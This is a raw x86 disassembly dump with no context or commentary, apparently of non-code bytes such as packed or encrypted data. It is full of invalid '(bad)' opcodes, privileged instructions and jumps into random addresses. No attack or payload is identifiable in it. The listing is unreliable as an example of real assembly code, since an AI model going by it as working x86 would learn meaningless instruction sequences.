  418111:	pop    DWORD PTR [esi+0x23]
  418114:	xchg   DWORD PTR [edx-0x3e],edx
  418117:	inc    esi
  418118:	dec    esi
  418119:	mov    DWORD PTR [esi+esi*8-0x47],ebp
  41811d:	shl    BYTE PTR [ecx-0x6946203e],1
  418123:	push   cs
  418124:	sbb    BYTE PTR [ebx],dl
  418126:	mov    esp,0xba075c35
  41812b:	dec    eax
  41812c:	mov    edx,ebx
  41812e:	sbb    eax,0xc12e7106
  418133:	dec    esi
  418134:	sar    DWORD PTR gs:[esi+0x40],cl
  418138:	dec    ebp
  418139:	adc    DWORD PTR [eax+0x675d1b8],esi
  41813f:	jmp    0x4180f4
  418141:	mov    esp,fs
  418143:	push   ebx
  418144:	or     eax,0x4b70ac80
  418149:	gs jecxz 0x41819a
  41814c:	mov    al,ds:0x84cbe8af
  418151:	xchg   ecx,eax
  418152:	out    0x3d,eax
  418154:	aam    0x28
  418156:	aad    0xa2
  418158:	scas   al,BYTE PTR es:[edi]
  418159:	je     0x418155
  41815b:	enter  0xe875,0xf6
  41815f:	out    dx,eax
  418160:	cmp    eax,0x58666577
  418165:	enter  0x1c2c,0x16
  418169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41816a:	aam    0x8b
  41816c:	jle    0x4181e5
  41816e:	(bad)  
  41816f:	pop    edi
  418170:	fisttp DWORD PTR [ebx+0x2ca5d933]
  418176:	add    BYTE PTR [eax],bh
  418178:	lea    eax,[eax]
  41817a:	inc    esi
  41817b:	ror    BYTE PTR ds:0xa7d0e1c1,cl
  418181:	imul   edi,esp,0x14
  418184:	inc    ebp
  418185:	fadd   DWORD PTR [ecx+ecx*8-0x63]
  418189:	addr16 pop esi
  41818b:	and    edi,DWORD PTR [ebx-0x1c33e755]
  418191:	adc    BYTE PTR [eax-0x2e7a2c74],0xd9
  418198:	mov    ds:0xe622d964,eax
  41819d:	inc    esi
  41819e:	cld    
  41819f:	fwait
  4181a0:	mov    WORD PTR [ecx-0x2a],es
  4181a3:	adc    al,0xe4
  4181a5:	repnz push edi
  4181a7:	sbb    dl,BYTE PTR [edi+0x754cf170]
  4181ad:	xor    DWORD PTR [ebp+edx*4+0x26],esi
  4181b1:	scas   eax,DWORD PTR es:[edi]
  4181b2:	xor    al,0x63
  4181b4:	add    BYTE PTR [eax],0x0
	...
  418213:	add    BYTE PTR [eax],al
  418215:	add    BYTE PTR [edi],dh
  418217:	xchg   edx,eax
  418218:	and    al,0x83
  41821a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41821b:	mov    bh,0xb7
  41821d:	mov    dh,0x16
  41821f:	mov    cl,ch
  418221:	(bad)  
  418222:	mov    bh,0xde
  418224:	jns    0x4181bf
  418226:	sub    ch,bh
  418228:	add    BYTE PTR [eax],al
  41822a:	pop    es
  41822b:	add    DWORD PTR [eax],eax
  41822d:	add    BYTE PTR [eax],dl
  41822f:	sub    BYTE PTR [esi-0x50a572ce],dh
  418235:	call   0xe0f0:0x9aa720dd
  41823c:	adc    BYTE PTR [ebp+0x5f821728],0x6f
  418243:	push   cs
  418244:	aad    0x15
  418246:	mov    dl,0xce
  418248:	mov    bh,0xd6
  41824a:	call   0xd3d6ff7b
  41824f:	mov    edx,0xb1db1d70
  418254:	addr16 push ebp
  418256:	call   FWORD PTR [edx+0x69f144a7]
  41825c:	aas    
  41825d:	fcomp  QWORD PTR [edi-0x6a594c4d]
  418263:	sbb    DWORD PTR [edi+0x1d],edx
  418266:	outs   dx,DWORD PTR ds:[esi]
  418267:	repnz (bad) 
  418269:	fdiv   QWORD PTR [ecx]
  41826b:	aam    0xa6
  41826d:	sub    ah,al
  41826f:	xchg   edi,eax
  418270:	sbb    eax,DWORD PTR [eax-0x65]
  418273:	xchg   edi,eax
  418274:	mov    ebx,ss
  418276:	lods   al,BYTE PTR ds:[esi]
  418277:	xor    BYTE PTR [ecx],0x66
  41827a:	or     BYTE PTR [esi],0xf8
  41827d:	push   esp
  41827e:	pmulhuw mm1,QWORD PTR es:[edx]
  418282:	fnstenv [edi+0x2]
  418285:	cdq    
  418286:	call   0xd81d7bec
  41828b:	das    
  41828c:	call   0x3cc39038
  418291:	(bad)  
  418293:	ins    BYTE PTR es:[edi],dx
  418294:	mov    eax,0xe3b87099
  418299:	push   ds
  41829a:	outs   dx,DWORD PTR ds:[esi]
  41829b:	(bad)  
  41829c:	mov    ebx,0x28878424
  4182a1:	or     DWORD PTR [ebp+0x27],esp
  4182a4:	addr16 daa 
  4182a6:	adc    esi,DWORD PTR [eax+0x70]
  4182a9:	in     al,0xd0
  4182ab:	pop    ss
  4182ac:	cs ins DWORD PTR es:[edi],dx
  4182ae:	add    dh,dh
  4182b0:	cwde   
  4182b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182b2:	(bad)  
  4182b3:	fcom   DWORD PTR [edx+0x3ecbb64c]
  4182b9:	or     eax,0xebf836a6
  4182be:	add    edx,DWORD PTR [ebx+0x59]
  4182c1:	adc    ah,BYTE PTR [edx]
  4182c3:	cmp    eax,0xca7bdb4
  4182c8:	mov    ecx,0x218e74cb
  4182cd:	jle    0x4182a4
  4182cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182d0:	push   ecx
  4182d1:	sbb    ah,dl
  4182d3:	daa    
  4182d4:	getsec 
  4182d6:	mov    ds,WORD PTR [ebp+0x5969918d]
  4182dc:	push   0xf1dcced6
  4182e1:	sar    DWORD PTR [edx],0x5d
  4182e4:	adc    ah,BYTE PTR [eax-0x762d1e7a]
  4182ea:	jle    0x418319
  4182ec:	cld    
  4182ed:	push   0x21110707
  4182f2:	ret    
  4182f3:	or     edi,esp
  4182f5:	mov    bl,0x74
  4182f7:	dec    edi
  4182f8:	sbb    ah,bh
  4182fa:	stos   BYTE PTR es:[edi],al
  4182fb:	icebp  
  4182fc:	iret   
  4182fd:	inc    esi
  4182fe:	push   es
  4182ff:	(bad)  
  418301:	xor    bh,bh
  418303:	lahf   
  418304:	data16 jae 0x4182c8
  418307:	adc    edx,DWORD PTR [esi+0x66]
  41830a:	jbe    0x418342
  41830c:	jg     0x4182e8
  41830e:	test   DWORD PTR [esi],0xeaeb83c4
  418314:	and    BYTE PTR [edx-0x502b225c],al
  41831a:	clc    
  41831b:	pop    ss
  41831c:	aad    0x4a
  41831e:	ret    
  41831f:	sbb    eax,0x23c8d198
  418324:	mov    ecx,0x4a2f05ee
  418329:	je     0x4182be
  41832b:	loope  0x418332
  41832d:	adc    eax,0xa37784af
  418332:	jne    0x418346
  418334:	push   0x0
	...
  418396:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41839c:	(bad)  
  41839d:	mov    edi,0xc253ee23
  4183a2:	je     0x41836d
  4183a4:	push   0xfe2f98
  4183a9:	add    BYTE PTR [edi],al
  4183ab:	add    DWORD PTR [eax],eax
  4183ad:	add    BYTE PTR [ebx+edi*4],bh
  4183b0:	sub    BYTE PTR [esp+0x65],cl
  4183b4:	add    DWORD PTR [eax-0x4],0xf
  4183b8:	adc    BYTE PTR [edi],0x76
  4183bb:	adc    bh,ah
  4183bd:	mov    edx,0xa24c6345
  4183c2:	inc    eax
  4183c3:	call   0xfcc7:0x6af5dfb8
  4183ca:	jmp    0x418395
  4183cc:	mov    eax,0x57ec661b
  4183d1:	out    dx,al
  4183d2:	add    BYTE PTR [edx+0x4b],ch
  4183d5:	xchg   DWORD PTR [esi+0x6],ecx
  4183d8:	pop    ebx
  4183d9:	hlt    
  4183da:	cwde   
  4183db:	cwde   
  4183dc:	mov    esp,0xb1922827
  4183e1:	mov    eax,ds:0x2ea2e28b
  4183e6:	(bad)  
  4183e7:	cmp    esp,DWORD PTR [ecx-0x24]
  4183ea:	repz lds ebx,FWORD PTR [edx-0x18b92c37]
  4183f1:	ret    
  4183f2:	xchg   esp,eax
  4183f3:	inc    esi
  4183f4:	mov    al,0x9d
  4183f6:	jb     0x41838b
  4183f8:	cld    
  4183f9:	pop    ecx
  4183fa:	jno    0x4183dc
  4183fc:	mov    al,ds:0x8dc6a237
  418401:	test   eax,0xba1eb2b2
  418406:	xchg   ebp,eax
  418407:	sbb    DWORD PTR [ebp-0x62ccf325],0xf0881698
  418411:	in     al,dx
  418412:	dec    DWORD PTR [ecx+0x40]
  418415:	push   es
  418416:	lock fist DWORD PTR [edx+0x9]
  41841a:	sub    BYTE PTR [edi+ecx*4],ch
  41841d:	mov    ch,0xa4
  41841f:	mov    ds:0x1cfcef11,eax
  418424:	inc    ebx
  418425:	sub    esi,ebp
  418427:	sbb    DWORD PTR [edx-0x2b],esp
  41842a:	cmp    al,0xd4
  41842c:	idiv   DWORD PTR [edx+0x492671b9]
  418432:	xchg   ebx,eax
  418433:	scas   eax,DWORD PTR es:[edi]
  418434:	int3   
  418435:	loopne 0x41846a
  418437:	fild   QWORD PTR [ecx]
  418439:	(bad)  
  41843a:	push   edi
  41843b:	cld    
  41843c:	xor    al,0x50
  41843e:	or     BYTE PTR [ebx-0x4684a23e],al
  418444:	cmp    eax,0xf80d3ad0
  418449:	xor    ecx,0x79
  41844c:	icebp  
  41844d:	lahf   
  41844e:	lods   al,BYTE PTR ds:[esi]
  41844f:	in     eax,0x39
  418451:	addr16 cmp eax,0xffffff9f
  418455:	sbb    eax,0x720ef853
  41845a:	jb     0x4183f3
  41845c:	sub    dl,ah
  41845e:	inc    ebx
  41845f:	xchg   edx,eax
  418460:	dec    esi
  418461:	add    DWORD PTR [edi+0x4f9c757],ebx
  418467:	mov    cl,BYTE PTR [eax+0x6ccded1f]
  41846d:	and    al,0xe5
  41846f:	or     al,0xf3
  418471:	push   edi
  418472:	and    dh,al
  418474:	fchs   
  418476:	mov    dh,0xc5
  418478:	fld    TBYTE PTR [eax+0x378d5080]
  41847e:	clc    
  41847f:	dec    edi
  418480:	es cmp cl,dl
  418483:	mov    dl,0x1e
  418485:	pop    edi
  418486:	lds    edi,FWORD PTR [ebx-0x3079840b]
  41848c:	ss xchg esi,eax
  41848e:	dec    eax
  41848f:	dec    DWORD PTR [ebp-0x22]
  418492:	add    BYTE PTR [ebx+0x4ef9b862],ah
  418498:	js     0x418501
  41849a:	cmp    bh,BYTE PTR [ebx-0x51df8ed2]
  4184a0:	cmp    bl,ch
  4184a2:	ins    DWORD PTR es:[edi],dx
  4184a3:	in     al,dx
  4184a4:	sub    eax,0x857066b5
  4184a9:	test   eax,0x70b650c7
  4184ae:	or     BYTE PTR [edx+0x17b39144],dh
  4184b4:	int3   
	...
  418515:	add    BYTE PTR [ecx-0x7],al
  418518:	mov    ebx,ebx
  41851a:	mov    ebx,0x26fb51fb
  41851f:	xchg   edi,eax
  418520:	mov    ecx,DWORD PTR [eax+esi*4+0x3663bd4f]
  418527:	inc    DWORD PTR [eax]
  418529:	add    BYTE PTR [edi],al
  41852b:	add    DWORD PTR [eax],eax
  41852d:	add    BYTE PTR [ebp-0x79],ah
  418530:	in     al,dx
  418531:	scas   eax,DWORD PTR es:[edi]
  418532:	xlat   BYTE PTR ds:[ebx]
  418533:	xchg   esp,esp
  418535:	or     DWORD PTR [ebx+esi*2+0x40],esi
  418539:	sbb    bl,BYTE PTR [edx+0x7d22ff18]
  41853f:	jg     0x4185af
  418541:	sbb    eax,0x3ec9d655
  418546:	jecxz  0x4184e0
  418548:	ret    0xe1a9
  41854b:	scas   al,BYTE PTR es:[edi]
  41854c:	lods   al,BYTE PTR ds:[esi]
  41854d:	push   edx
  41854e:	pop    ecx
  41854f:	aam    0x62
  418551:	(bad)  
  418552:	outs   dx,DWORD PTR ds:[esi]
  418553:	mov    ds:0x22a1fb13,eax
  418558:	inc    esi
  418559:	pop    edx
  41855a:	push   edi
  41855b:	push   0x7e050cc4
  418560:	aam    0xe2
  418562:	adc    ch,BYTE PTR [edi+0x37]
  418565:	mov    ebp,0x2439e429
  41856a:	lock jns 0x418528
  41856d:	mov    al,0x43
  41856f:	sub    esp,DWORD PTR [esi+0x6e]
  418572:	(bad)  
  418573:	cmc    
  418574:	fidiv  WORD PTR [ebx-0x1e]
  418577:	into   
  418578:	push   eax
  418579:	repz mov esi,0xcbeae254
  41857f:	mov    bh,0xf
  418581:	pushf  
  418582:	popf   
  418583:	aaa    
  418584:	sub    ch,BYTE PTR [ebx-0x4b]
  418587:	sahf   
  418588:	or     eax,0x21f94b5a
  41858d:	mov    BYTE PTR [esi-0x96bd1d0],ch
  418593:	add    DWORD PTR [edx-0xe],ecx
  418596:	or     al,0xfb
  418598:	sub    eax,0xcec6affd
  41859d:	das    
  41859e:	or     bh,cl
  4185a0:	sub    eax,0x97e7fdac
  4185a5:	cmp    BYTE PTR [edi],cl
  4185a7:	in     al,dx
  4185a8:	or     esp,edx
  4185aa:	jae    0x41853c
  4185ac:	sub    BYTE PTR [edx],dl
  4185ae:	or     al,0x96
  4185b0:	mov    esi,0x8807ffe
  4185b5:	inc    esp
  4185b6:	xchg   edx,eax
  4185b7:	inc    eax
  4185b8:	shl    BYTE PTR [eax+ebp*8],1
  4185bb:	(bad)  
  4185bc:	mov    ebx,0x2c91840c
  4185c1:	ss fs pop eax
  4185c4:	ins    BYTE PTR es:[edi],dx
  4185c5:	rcl    DWORD PTR [eax+0x3d],cl
  4185c8:	mov    bl,0x57
  4185ca:	retf   
  4185cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185cc:	dec    esi
  4185cd:	dec    eax
  4185ce:	cdq    
  4185cf:	repnz popf 
  4185d1:	bound  esi,QWORD PTR [ebx+ecx*8+0x5359249]
  4185d8:	cwde   
  4185d9:	enter  0x8995,0x3a
  4185dd:	push   edx
  4185de:	adc    ebx,DWORD PTR [di]
  4185e1:	pop    ds
  4185e2:	mov    edi,0x43214149
  4185e7:	call   0xc29c:0x36ea4b72
  4185ee:	hlt    
  4185ef:	lock call esp
  4185f2:	pop    esp
  4185f3:	(bad)  
  4185f5:	inc    eax
  4185f6:	bound  edi,QWORD PTR [edx]
  4185f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185f9:	pop    ecx
  4185fa:	mov    ecx,DWORD PTR [eax-0x79c5c3bd]
  418600:	and    BYTE PTR [eax+0x64],ch
  418603:	cld    
  418604:	sbb    BYTE PTR [ebx+0x40a6d6fc],ah
  41860a:	mov    edx,0x13551c96
  41860f:	and    DWORD PTR [edi+0x5c6dbbb4],esi
  418615:	mov    ecx,0x232428f8
  41861a:	add    al,0x91
  41861c:	push   edi
  41861d:	push   esi
  41861e:	cmp    DWORD PTR [ebx],edi
  418620:	(bad)  [eax+0x144de874]
  418626:	jo     0x4185f8
  418628:	mov    al,ds:0x1e2f3723
  41862d:	jae    0x4186a2
  41862f:	rol    BYTE PTR [eax+0x2],1
  418632:	lds    eax,FWORD PTR [edx+0x11]
	...
  418694:	add    BYTE PTR [eax],al
  418696:	xchg   ebx,eax
  418697:	sub    BYTE PTR [eax-0x604344c4],ah
  41869d:	scas   eax,DWORD PTR es:[edi]
  41869e:	pop    es
  41869f:	mov    edx,0xdbd7be30
  4186a4:	shr    DWORD PTR [ebx],0x3d
  4186a7:	add    BYTE PTR [ecx],al
  4186a9:	add    BYTE PTR [edi],al
  4186ab:	add    DWORD PTR [eax],eax
  4186ad:	add    BYTE PTR [edx-0x3d2ae163],bh
  4186b3:	test   DWORD PTR [ebx],esi
  4186b5:	dec    esp
  4186b6:	dec    ecx
  4186b7:	add    eax,0x4711a26
  4186bc:	adc    eax,0x36cda736
  4186c1:	les    ecx,FWORD PTR [esi+0xf]
  4186c4:	mov    eax,ds:0xc5bad53e
  4186c9:	jge    0x4186ba
  4186cb:	in     al,dx
  4186cc:	lock mov dl,0xe8
  4186cf:	out    dx,al
  4186d0:	loop   0x418676
  4186d2:	imul   esp,DWORD PTR [edi+0x11],0xffffffd2
  4186d6:	xchg   ebx,eax
  4186d7:	inc    esi
  4186d8:	xlat   BYTE PTR ds:[bx]
  4186da:	pop    ebx
  4186db:	cli    
  4186dc:	dec    esp
  4186dd:	(bad)  
  4186de:	push   ebp
  4186df:	into   
  4186e0:	pop    ss
  4186e1:	mov    esi,0xf5e42c49
  4186e6:	sub    dh,BYTE PTR [ebx-0x16]
  4186e9:	dec    edx
  4186ea:	fwait
  4186eb:	test   BYTE PTR [edi+eax*8+0x50a1d6ee],0xe2
  4186f3:	ds push edx
  4186f5:	cmp    edi,ebp
  4186f7:	call   0x4d04:0xf421d94b
  4186fe:	aaa    
  4186ff:	jo     0x418725
  418701:	loopne 0x418747
  418703:	imul   eax,DWORD PTR [edi-0x15],0xe3212a24
  41870a:	sub    DWORD PTR [ebp-0x26c55b30],ebx
  418710:	add    BYTE PTR [ebx+edx*8+0x5a],dh
  418714:	ds out 0xe5,eax
  418717:	jno    0x418737
  418719:	(bad)  
  41871a:	rcr    BYTE PTR [edi],0x63
  41871d:	out    dx,al
  41871e:	mov    BYTE PTR [edx],cl
  418720:	mov    al,0xad
  418722:	adc    al,0xa2
  418724:	mov    bh,dh
  418726:	dec    ebp
  418727:	repnz sti 
  418729:	add    ebp,DWORD PTR [ebx]
  41872b:	dec    esp
  41872c:	jle    0x4186e1
  41872e:	and    edx,ecx
  418730:	mov    ebx,0x167b693d
  418735:	call   0x62be6b4d
  41873a:	and    edi,DWORD PTR [edx+ebp*1-0x54e25337]
  418741:	xchg   DWORD PTR [esi-0xc5e712],edi
  418747:	dec    esi
  418748:	dec    bp
  41874a:	enter  0x8a72,0x8d
  41874e:	push   ds
  41874f:	adc    ebx,DWORD PTR [edi+0x2984a09e]
  418755:	fwait
  418756:	je     0x41875d
  418758:	dec    edx
  418759:	dec    ebp
  41875a:	mov    dh,0x81
  41875c:	xor    dh,BYTE PTR [eax+0x54]
  41875f:	inc    eax
  418760:	mov    WORD PTR [ebx-0x43443fa7],ss
  418766:	call   FWORD PTR [ebx+0x4932daba]
  41876c:	shl    BYTE PTR ds:0xd632505d,cl
  418772:	push   esi
  418773:	adc    BYTE PTR [esi+0x4b],ah
  418776:	adc    ebp,DWORD PTR [eax-0x20]
  418779:	test   al,0x96
  41877b:	or     edi,esp
  41877d:	xchg   esi,eax
  41877e:	adc    BYTE PTR [edx-0x6c],0x1e
  418782:	ds mov ch,0x66
  418785:	or     cl,BYTE PTR [edi-0x62]
  418788:	sbb    eax,0x3840890b
  41878d:	push   ebx
  41878e:	test   BYTE PTR [edi],dh
  418790:	jp     0x41876c
  418792:	dec    edi
  418793:	fs add al,0x93
  418796:	jmp    edx
  418798:	jmp    0xac96933a
  41879d:	or     ah,0x4e
  4187a0:	outs   dx,DWORD PTR ds:[esi]
  4187a1:	or     bl,BYTE PTR [ebx+0x7cdb60fc]
  4187a7:	test   DWORD PTR [edi+ebp*2-0x6b8285a1],ebp
  4187ae:	xchg   edi,eax
  4187af:	shl    DWORD PTR [edi-0x1],cl
  4187b2:	add    BYTE PTR [ebx],0xe4
	...
  418815:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41881c:	hlt    
  41881d:	fisttp WORD PTR [eax]
  41881f:	test   eax,0xcaf57be5
  418824:	lods   al,BYTE PTR ds:[esi]
  418825:	mov    edx,0x10144
  41882a:	pop    es
  41882b:	add    DWORD PTR [eax],eax
  41882d:	add    BYTE PTR [edx+edi*4+0x1d],bh
  418831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418832:	ficom  WORD PTR [edi+0x471df32f]
  418838:	iret   
  418839:	sub    eax,0x27051114
  41883e:	mov    bl,0x3c
  418840:	sahf   
  418841:	jmp    0x7332683e
  418846:	(bad)  [edi+ebp*2+0x5e60b753]
  41884d:	sbb    eax,0xea4651a2
  418852:	les    edx,FWORD PTR [edx-0xc5b8eea]
  418858:	push   0xbc53665d
  41885d:	mov    al,ds:0x2543da32
  418862:	mov    DWORD PTR gs:[ebp-0x5b],ebp
  418866:	mov    BYTE PTR [ecx+0xe],dh
  418869:	sub    al,BYTE PTR [eax-0x75]
  41886c:	ins    BYTE PTR es:[edi],dx
  41886d:	jge    0x418844
  41886f:	or     DWORD PTR [eax+0x7e23fde2],esp
  418875:	xor    ecx,DWORD PTR ds:0x39b709b2
  41887b:	inc    ebx
  41887c:	or     BYTE PTR [eax+0x58689d3a],al
  418882:	cmp    BYTE PTR [edx-0xa],bh
  418885:	mov    ebp,0xad769a04
  41888a:	cli    
  41888b:	sbb    al,ah
  41888d:	dec    ecx
  41888e:	repnz sub al,0x33
  418891:	shl    DWORD PTR [ecx-0xe58696e],0x34
  418898:	ffreep st(0)
  41889a:	leave  
  41889b:	je     0x418829
  41889d:	test   al,0xd8
  41889f:	int    0xca
  4188a1:	push   esp
  4188a2:	inc    esp
  4188a3:	imul   edx,esp,0x9243993d
  4188a9:	xor    BYTE PTR [eax],dl
  4188ab:	or     cl,BYTE PTR [eax-0x63ce6db3]
  4188b1:	add    al,0x4d
  4188b3:	or     DWORD PTR [esi-0x74],ecx
  4188b6:	push   ebp
  4188b7:	mov    dh,0x14
  4188b9:	or     al,0x5b
  4188bb:	ds jb  0x418899
  4188be:	loopne 0x418841
  4188c0:	jno    0x41885c
  4188c2:	jns    0x418871
  4188c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188c5:	sahf   
  4188c6:	push   edi
  4188c7:	(bad)  
  4188c9:	dec    ebp
  4188ca:	jo     0x4188a6
  4188cc:	xchg   esi,eax
  4188cd:	popa   
  4188ce:	nop
  4188cf:	adc    esp,esp
  4188d1:	ins    DWORD PTR es:[edi],dx
  4188d2:	stc    
  4188d3:	xchg   BYTE PTR [esi+0x1],al
  4188d6:	ror    BYTE PTR [edx],1
  4188d8:	sti    
  4188d9:	dec    edx
  4188da:	sub    al,0xf9
  4188dc:	(bad)  
  4188dd:	rcl    ch,1
  4188df:	aam    0xb0
  4188e1:	sbb    eax,0xbb559238
  4188e6:	add    al,0x1d
  4188e8:	out    dx,eax
  4188e9:	(bad)  
  4188ea:	outs   dx,DWORD PTR ds:[esi]
  4188eb:	push   eax
  4188ec:	(bad)
  4188ef:	push   ds
  4188f0:	jecxz  0x41891a
  4188f2:	pop    edi
  4188f3:	push   edx
  4188f4:	adc    al,0x20
  4188f6:	dec    esp
  4188f7:	out    dx,eax
  4188f8:	lods   eax,DWORD PTR ds:[esi]
  4188f9:	cmp    DWORD PTR [ebp-0x2d389e39],ebp
  4188ff:	mov    al,ds:0x7f19d976
  418904:	fild   QWORD PTR [ecx+0x7e0c73cf]
  41890a:	mov    esp,0x12ad598f
  41890f:	aad    0x46
  418911:	std    
  418912:	imul   ebx,DWORD PTR [ebx+edi*2+0x70],0xffffffa6
  418917:	retf   0xd1f8
  41891a:	xlat   BYTE PTR ds:[ebx]
  41891b:	out    0xb7,eax
  41891d:	in     al,0xd5
  41891f:	aad    0x19
  418921:	leave  
  418922:	nop
  418923:	adc    eax,ebx
  418925:	pop    ss
  418926:	aad    0x8e
  418928:	inc    eax
  418929:	scas   eax,DWORD PTR es:[edi]
  41892a:	mov    ds:0x805704f8,eax
  41892f:	(bad)  
  418930:	sub    cl,ch
  418932:	xchg   esp,eax
  418933:	sbb    al,0x67
	...
  418995:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  41899c:	into   
  41899d:	fwait
  41899e:	cmc    
  41899f:	pop    edx
  4189a0:	sub    ecx,DWORD PTR [esi+0x1fbbe1dc]
  4189a6:	dec    ebx
  4189a7:	add    al,BYTE PTR [ecx]
  4189a9:	add    BYTE PTR [edi],al
  4189ab:	add    DWORD PTR [eax],eax
  4189ad:	add    cl,dh
  4189af:	pop    ds
  4189b0:	imul   ebp,edi,0x73
  4189b3:	fldcw  WORD PTR [ebx-0x23]
  4189b6:	mul    BYTE PTR [edx]
  4189b8:	(bad)
  4189bb:	(bad)  
  4189bd:	hlt    
  4189be:	fcom   st(4)
  4189c0:	retf   
  4189c1:	add    eax,0x25cc44bb
  4189c6:	jno    0x41896a
  4189c8:	outs   dx,DWORD PTR ds:[esi]
  4189c9:	mov    esi,0xa92f27a9
  4189ce:	push   ecx
  4189cf:	pop    es
  4189d0:	or     ch,bh
  4189d2:	std    
  4189d3:	nop
  4189d4:	pop    es
  4189d5:	pop    esp
  4189d6:	(bad)  
  4189d7:	(bad)  
  4189d8:	mul    bh
  4189da:	add    BYTE PTR [ebx+0x61995f85],bh
  4189e0:	mov    ah,0x26
  4189e2:	xchg   ecx,eax
  4189e3:	repz aas 
  4189e5:	in     eax,dx
  4189e6:	add    dh,BYTE PTR [esi]
  4189e8:	retf   
  4189e9:	loope  0x418a67
  4189eb:	scas   eax,DWORD PTR es:[edi]
  4189ec:	stc    
  4189ed:	pusha  
  4189ee:	pop    edx
  4189ef:	mov    edx,0x14892dfe
  4189f4:	rcr    cl,0xa5
  4189f7:	ins    DWORD PTR es:[edi],dx
  4189f8:	ss and al,0xe
  4189fb:	add    DWORD PTR [edi],0xffffffe7
  4189fe:	adc    ch,0x40
  418a01:	xchg   BYTE PTR [ecx-0x18af1886],cl
  418a07:	stos   DWORD PTR es:[edi],eax
  418a08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a09:	mov    dl,0x3e
  418a0b:	addr16 aam 0x9
  418a0e:	dec    edi
  418a0f:	dec    esp
  418a10:	hlt    
  418a11:	push   edi
  418a12:	adc    eax,0x4829b5dc
  418a17:	cmc    
  418a18:	adc    BYTE PTR ds:0x890c148e,0x36
  418a1f:	mov    edi,0xf8044662
  418a24:	mov    edx,0xe4443e90
  418a29:	mov    edx,0xd30c419
  418a2e:	ds xchg edi,eax
  418a30:	add    dh,BYTE PTR [eax-0x419c65f8]
  418a36:	idiv   BYTE PTR [esi-0x6172230]
  418a3c:	call   0x1aa4:0xda13b4b7
  418a43:	sub    ch,cl
  418a45:	cmp    BYTE PTR [esi+0x4992fa2d],bl
  418a4b:	repz je 0x418abd
  418a4e:	(bad)  
  418a4f:	sahf   
  418a50:	jp     0x418a56
  418a52:	stos   BYTE PTR es:[edi],al
  418a53:	mov    esi,DWORD PTR [edi]
  418a55:	sbb    BYTE PTR [esi+0x2],ah
  418a58:	xchg   esi,eax
  418a59:	ja     0x418a99
  418a5b:	fidiv  DWORD PTR [edi+0x36]
  418a5e:	inc    ebp
  418a5f:	ins    BYTE PTR es:[edi],dx
  418a60:	pop    edi
  418a61:	sub    eax,0x6ffb7814
  418a66:	and    bl,BYTE PTR [ebp+ebp*4-0x50]
  418a6a:	push   ds
  418a6b:	inc    esi
  418a6c:	mov    ecx,0x7116384a
  418a72:	cs stc 
  418a74:	in     al,0x33
  418a76:	sbb    al,0x69
  418a78:	sub    BYTE PTR [ecx],ch
  418a7a:	and    BYTE PTR [esi-0x7b167618],ah
  418a80:	mov    esi,esi
  418a82:	fadd   DWORD PTR [eax+0x1f6ade75]
  418a88:	rcl    DWORD PTR [eax],1
  418a8a:	pop    ebp
  418a8b:	xor    DWORD PTR [eax+0x7],ebp
  418a8e:	test   al,0xef
  418a90:	sbb    eax,0x54f0c7e6
  418a95:	and    BYTE PTR [esi],bh
  418a97:	outs   dx,BYTE PTR ds:[esi]
  418a98:	pushf  
  418a99:	outs   dx,DWORD PTR ds:[esi]
  418a9a:	mov    ecx,0x91d302c
  418a9f:	fcom   QWORD PTR [edi+0x62]
  418aa2:	rcl    BYTE PTR [ebx],1
  418aa4:	pop    ds
  418aa5:	cdq    
  418aa6:	or     ah,BYTE PTR [esi+0x1da2bb7b]
  418aac:	pop    ds
  418aad:	test   al,0x7b
  418aaf:	adc    al,cl
  418ab1:	jo     0x418aaf
  418ab3:	ficomp DWORD PTR [edi]
	...
  418b15:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b19:	xor    ch,bh
  418b1b:	mov    dh,0xff
  418b1d:	pop    edi
  418b1e:	mov    al,ds:0xd30941ce
  418b23:	aas    
  418b24:	pop    esi
  418b25:	jg     0x418b79
  418b27:	add    eax,DWORD PTR [ecx]
  418b29:	add    BYTE PTR [edi],al
  418b2b:	add    DWORD PTR [eax],eax
  418b2d:	add    BYTE PTR [esi+ecx*2],al
  418b30:	lods   al,BYTE PTR ds:[esi]
  418b31:	(bad)  
  418b33:	rol    DWORD PTR [ecx-0x5c],1
  418b36:	sub    al,0xac
  418b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b39:	push   edi
  418b3a:	mov    DWORD PTR [edi+0x6c20c01b],ecx
  418b40:	jp     0x418ad3
  418b42:	pop    es
  418b43:	jmp    0x8dde6c1
  418b48:	sbb    DWORD PTR [ebx-0x25],ebx
  418b4b:	sbb    al,0x70
  418b4d:	push   esp
  418b4e:	(bad)  
  418b4f:	fsubr  DWORD PTR [ebp+0x4e]
  418b52:	jo     0x418b57
  418b54:	xchg   esi,eax
  418b55:	xor    al,0x2c
  418b57:	sbb    BYTE PTR [ecx+esi*8-0x79abd041],bh
  418b5e:	mov    eax,0x32ca4654
  418b63:	xchg   DWORD PTR [eax],esp
  418b65:	sub    ch,BYTE PTR [ebp-0x3caa72d4]
  418b6b:	ret    0xd996
  418b6e:	inc    edi
  418b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b70:	dec    eax
  418b71:	outs   dx,DWORD PTR ds:[esi]
  418b72:	repz cld 
  418b74:	out    dx,al
  418b75:	pop    edx
  418b76:	not    ecx
  418b78:	sbb    esi,DWORD PTR [edx-0x13a39d12]
  418b7e:	inc    edx
  418b7f:	jno    0x418bbb
  418b81:	in     eax,0x29
  418b83:	xchg   esi,eax
  418b84:	(bad)  
  418b86:	jmp    0x955976e7
  418b8b:	scas   al,BYTE PTR es:[edi]
  418b8c:	xchg   esp,eax
  418b8d:	adc    esp,DWORD PTR [esi+0x6f529cd7]
  418b93:	mov    ah,0xad
  418b95:	xchg   esi,eax
